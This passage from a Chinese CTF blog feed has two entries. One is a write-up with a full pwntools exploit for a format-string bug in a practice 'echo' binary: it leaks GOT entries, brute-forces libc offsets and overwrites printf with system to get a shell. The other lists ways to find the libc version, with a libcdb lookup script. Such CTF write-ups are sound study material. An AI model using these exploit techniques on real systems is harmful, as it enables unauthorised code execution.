class="built_in">puts</span>(<span class="string">"All is Done"</span>);</div><div class="line">  &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure><p>可以直接看到，有两处fmt漏洞，这是个循环，我们只需要循环利用其中一个fmt漏洞就可以。</p><p>我们可以利用pwntools提供fmt自动利用的功能快速算出格式化字符串在栈中的偏移。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># stage 1 get fmt offset</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">exec_fmt</span><span class="params">(payload)</span>:</span></div><div class="line">p = process(target)</div><div class="line">p.recvuntil(<span class="string">"input:"</span>)</div><div class="line">p.sendline(payload)</div><div class="line">p.recvuntil(<span class="string">"input:"</span>)</div><div class="line">p.sendline(payload)</div><div class="line"><span class="keyword">return</span> p.recvuntil(<span class="string">","</span>)[:<span class="number">-1</span>]</div><div class="line"></div><div class="line">autofmt = FmtStr(exec_fmt)</div><div class="line">offset = autofmt.offset</div></pre></td></tr></table></figure><p>泄露出其中一个库函数地址后，利用我们本地搭建好的libc-database库算出system函数的地址。(如果出现多个匹配的话，就爆破吧:P</p><p>主要的还是它可以自动完成任意地址写的payload，就适合我这种深度懒癌患者</p><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">send_payload</span><span class="params">(payload)</span>:</span></div><div class="line">ru(<span class="string">"input:"</span>)</div><div class="line">sl(payload)</div><div class="line">ru(<span class="string">"input:"</span>)</div><div class="line">sl(<span class="string">"/bin/sh\x00"</span>)</div><div class="line">autofmt = FmtStr(send_payload,offset=offset)</div><div class="line">autofmt.write(printf_got,system_addr)</div><div class="line">autofmt.execute_writes()</div></pre></td></tr></table></figure><p>总的exp是这样子的。大概爆破三次就出结果，这还是我只泄露了一个库函数地址的情况下。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#!/usr/bin/env python</span></div><div class="line"><span class="comment"># -*- coding: utf-8 -*-</span></div><div class="line"><span class="comment"># @Date    : 2017-04-08 21:08:57</span></div><div class="line"><span class="comment"># @Author  : WinterSun (511683586@qq.com)</span></div><div class="line"><span class="comment"># @Link    : https://Winter3un.github.io/</span></div><div class="line"><span class="keyword">import</span> roputils</div><div class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</div><div class="line">context(log_level=<span class="string">"debug"</span>)</div><div class="line">DEBUG = <span class="number">1</span></div><div class="line">target = <span class="string">"./echo"</span></div><div class="line">rop = roputils.ROP(target)</div><div class="line">bss = rop.section(<span class="string">'.bss'</span>)+<span class="number">0x30</span></div><div class="line">printf_got = rop.got(<span class="string">'printf'</span>)</div><div class="line"></div><div class="line"><span class="keyword">if</span> DEBUG:</div><div class="line">p = process(target)</div><div class="line"><span class="comment"># gdb.attach(p,"b*0x80486C1\nc")</span></div><div class="line"><span class="keyword">else</span>:</div><div class="line">p = remote()</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">sl</span><span class="params">(data)</span>:</span></div><div class="line">p.sendline(data)</div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">sd</span><span class="params">(data)</span>:</span></div><div class="line">p.send(data)</div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">ru</span><span class="params">(data)</span>:</span></div><div class="line"><span class="keyword">return</span> p.recvuntil(data)</div><div class="line"></div><div class="line"><span class="comment"># stage 1 get fmt offset</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">exec_fmt</span><span class="params">(payload)</span>:</span></div><div class="line">p = process(target)</div><div class="line">p.recvuntil(<span class="string">"input:"</span>)</div><div class="line">p.sendline(payload)</div><div class="line">p.recvuntil(<span class="string">"input:"</span>)</div><div class="line">p.sendline(payload)</div><div class="line"><span class="keyword">return</span> p.recvuntil(<span class="string">","</span>)[:<span class="number">-1</span>]</div><div class="line"></div><div class="line">autofmt = FmtStr(exec_fmt)</div><div class="line">offset = autofmt.offset</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">send_payload</span><span class="params">(payload)</span>:</span></div><div class="line">ru(<span class="string">"input:"</span>)</div><div class="line">sl(payload)</div><div class="line">ru(<span class="string">"input:"</span>)</div><div class="line">sl(<span class="string">"/bin/sh\x00"</span>)</div><div class="line"></div><div class="line"><span class="comment"># stage 2 get system_addr</span></div><div class="line"></div><div class="line">offset_system = [<span class="number">-63744</span>, <span class="number">-78400</span>, <span class="number">-55008</span>, <span class="number">-57072</span>, <span class="number">-55136</span>, <span class="number">-61392</span>, <span class="number">-55120</span>, <span class="number">-59840</span>, <span class="number">-64784</span>, <span class="number">-59456</span>, <span class="number">-58400</span>, <span class="number">-58480</span>, <span class="number">-60464</span>, <span class="number">-76112</span>, <span class="number">3792</span>, <span class="number">-70432</span>, <span class="number">-58160</span>, <span class="number">-1063904</span>, <span class="number">-1042576</span>, <span class="number">-1041936</span>, <span class="number">-68192</span>, <span class="number">-77448</span>, <span class="number">-51488</span>, <span class="number">-71904</span>]</div><div class="line"><span class="keyword">for</span> o <span class="keyword">in</span> offset_system:</div><div class="line"><span class="keyword">try</span>:</div><div class="line">p = process(target)</div><div class="line">printf_got = rop.got(<span class="string">"printf"</span>)</div><div class="line">puts_got = rop.got(<span class="string">"puts"</span>)</div><div class="line"></div><div class="line">ru(<span class="string">"input:"</span>)</div><div class="line">sl(p32(printf_got)+<span class="string">"%7$s"</span>)</div><div class="line">ru(<span class="string">"input:"</span>)</div><div class="line">sl(<span class="string">"payload"</span>)</div><div class="line"></div><div class="line">printf_addr = u32(p.recv(<span class="number">8</span>)[<span class="number">4</span>:])</div><div class="line"></div><div class="line">ru(<span class="string">"input:"</span>)</div><div class="line">sl(p32(puts_got)+<span class="string">"%7$s"</span>)</div><div class="line">ru(<span class="string">"input:"</span>)</div><div class="line">sl(<span class="string">"payload"</span>)</div><div class="line"></div><div class="line">puts_addr = u32(p.recv(<span class="number">8</span>)[<span class="number">4</span>:])</div><div class="line"></div><div class="line"><span class="keyword">print</span> <span class="string">"printf_addr="</span>+hex(printf_addr)</div><div class="line"><span class="keyword">print</span> <span class="string">"puts_addr="</span>+hex(puts_addr)</div><div class="line"></div><div class="line"></div><div class="line">system_addr = printf_addr+o</div><div class="line"></div><div class="line"><span class="comment"># stage 3 change printf_addr to system_addr</span></div><div class="line">autofmt = FmtStr(send_payload,offset=offset)</div><div class="line">autofmt.write(printf_got,system_addr)</div><div class="line">autofmt.execute_writes()</div><div class="line"><span class="comment"># print offset</span></div><div class="line"><span class="comment"># print "bss_addr="+hex(bss)</span></div><div class="line"><span class="comment"># payload = fmtstr_payload(1,&#123;bss:0xdeadbeaf&#125;,1,"byte")</span></div><div class="line"><span class="comment"># print payload</span></div><div class="line"></div><div class="line">p.interactive()</div><div class="line"><span class="keyword">except</span>:</div><div class="line"><span class="keyword">continue</span></div></pre></td></tr></table></figure><p>后记：啥时候出个FSP自动利用的啊。。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;翻pwntools文档的时候突然发现了pwntools多了一个自动完成fmt漏洞利用的特性。&lt;/p&gt;
&lt;p&gt;官方文档链接  &lt;a href=&quot;http://pwntools.readthedocs.io/en/stable/fmtstr.html&quot; target=&quot;_bla
      
    
    </summary>
    
    
      <category term="pwn" scheme="https://winter3un.github.io/tags/pwn/"/>
    
      <category term="pwntools" scheme="https://winter3un.github.io/tags/pwntools/"/>
    
      <category term="fmt" scheme="https://winter3un.github.io/tags/fmt/"/>
    
  </entry>
  
  <entry>
    <title>how_to_get_libc</title>
    <link href="https://winter3un.github.io/2017/04/08/how-to-get-libc/"/>
    <id>https://winter3un.github.io/2017/04/08/how-to-get-libc/</id>
    <published>2017-04-08T07:29:54.000Z</published>
    <updated>2017-05-22T16:58:15.000Z</updated>
    
    <content type="html"><![CDATA[<p>比赛的时候，遇到比较坑爹的情况，没有提供给libc库，这个时候就需要用各种姿势去泄露libc库。</p><p>1、询问组委会，是否提供libc库，很有可能就放提示了</p><p>2、通过return2libc技巧，泄露got内保存的库函数地址，去 <a href="http://libcdb.com/" target="_blank" rel="external">http://libcdb.com/</a>  找对应的库版本，这边我写了一个get_libc的小脚本（但并不是百分之一百能找到的。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> requests <span class="keyword">import</span> *</div><div class="line"><span class="keyword">import</span> re</div><div class="line"><span class="comment"># a_name = raw_input('input a_name= ')</span></div><div class="line"><span class="comment"># a_addr = raw_input('input a_addr=')</span></div><div class="line"><span class="comment"># b_name = raw_input('input b_name=')</span></div><div class="line"><span class="comment"># b_addr = raw_input('input b_addr=')</span></div><div class="line"><span class="comment"># a_name= 'read'</span></div><div class="line"><span class="comment"># a_addr='0xb76a9bd0'</span></div><div class="line"><span class="comment"># b_name='shutdown'</span></div><div class="line"><span class="comment"># b_addr='0xb76bc610'</span></div><div class="line">a_name=<span class="string">'printf'</span></div><div class="line">a_addr=<span class="string">'0x7f0ff5dadba0'</span></div><div class="line">b_name=<span class="string">'read'</span></div><div class="line">b_addr=<span class="string">'0x7f0ff5e50470'</span></div><div class="line"></div><div class="line">may_system_offset=[]</div><div class="line">url = <span class="string">'http://libcdb.com/search?symbolA='</span>+a_name+<span class="string">'&amp;addressA='</span>+a_addr+<span class="string">'&amp;symbolB='</span>+b_name+<span class="string">'&amp;addressB='</span>+b_addr</div><div class="line">r1 = get(url)</div><div class="line">list_ = re.findall(<span class="string">r'&lt;li&gt;&lt;a href="(.*?)"&gt;Libc\:'</span>,r1.content)</div><div class="line">payload = <span class="string">'may_system_offset = ['</span></div><div class="line"><span class="keyword">if</span> len(list_)&gt;<span class="number">0</span>:</div><div class="line"><span class="keyword">for</span> x <span class="keyword">in</span> list_:</div><div class="line">url = <span class="string">'http://libcdb.com'</span>+x+<span class="string">'/symbols?name=__libc_system'</span></div><div class="line">system_offset = get(url)</div><div class="line">system_offset = re.findall(<span class="string">r'/dt&gt;\n        &lt;dd&gt;(.*?)&lt;/dd&gt;\n        \n    &lt;/dl&gt;'</span>,system_offset.content)[<span class="number">0</span>].replace(<span class="string">'libc_base + 0x'</span>,<span class="string">''</span>)</div><div class="line"><span class="keyword">print</span> system_offset</div><div class="line">url = <span class="string">'http://libcdb.com'</span>+x+<span class="string">'/symbols?name='</span>+b_name</div><div class="line">func_offset = get(url)</div><div class="line"><span class="comment"># print func_offset.content</span></div><div class="line">func_offset = re.findall(<span class="string">r'&gt;'</span>+b_name+<span class="string">'&lt;/dt&gt;\n        &lt;dd&gt;(.*?)&lt;/dd&gt;'</span>,func_offset.content)[<span class="number">0</span>].replace(<span class="string">'libc_base + 0x'</span>,<span class="string">''</span>)</div><div class="line">may_system_offset.append(int(system_offset,<span class="number">16</span>)-int(func_offset,<span class="number">16</span>))</div><div class="line">may_system_offset = list(set(may_system_offset))</div><div class="line"><span class="keyword">for</span> x <span class="keyword">in</span> may_system_offset:</div><div class="line">payload += hex(x)+<span class="string">','</span></div><div class="line">payload = payload[:<span class="number">-1</span>]</div><div class="line"><span class="keyword">print</span> payload+<span class="string">']'</span></div><div class="line"><span class="keyword">else</span>:</div><div class="line"><span class="keyword">print</span> <span class="string">'oops! nothing!'</span></div><div class="line"></div><div class="line">raw_input()</div></pre></td></tr></table></figure><p>3、利用return to dl resolve技术，这个已经有成熟的辅助工具了。<a href="https://github.com/inaz2/roputils" target="_blank" rel="external">https://github.com/inaz2/roputils</a></p><p>4、利用其他题目的libc库，出题人为了方便，很有可能用的相同libc库</p><p>5、利用pwntools提供的dynelf函数来寻找system地址，不过需要有个leak函数。可参考 <a href="http://bobao.360.cn/learning/detail/3298.html" target="_blank" rel="external">http://bobao.360.cn/learning/detail/3298.html</a> （蛋疼的是，不知道为啥我的ELF()函数一直是坏的。</p><hr><p>2017/5/23日添加</p><p>6、泄露Smallbin的FD、BK进行libc base获取</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;比赛的时候，遇到比较坑爹的情况，没有提供给libc库，这个时候就需要用各种姿势去泄露libc库。&lt;/p&gt;
&lt;p&gt;1、询问组委会，是否提供libc库，很有可能就放提示了&lt;/p&gt;
&lt;p&gt;2、通过return2libc技巧，泄露got内保存的库函数地址，去 &lt;a href=&quot;ht
      
    
    </summary>
    
    
      <category term="pwn" scheme="https://winter3un.github.io/tags/pwn/"/>
    
  </entry>
  
</feed>
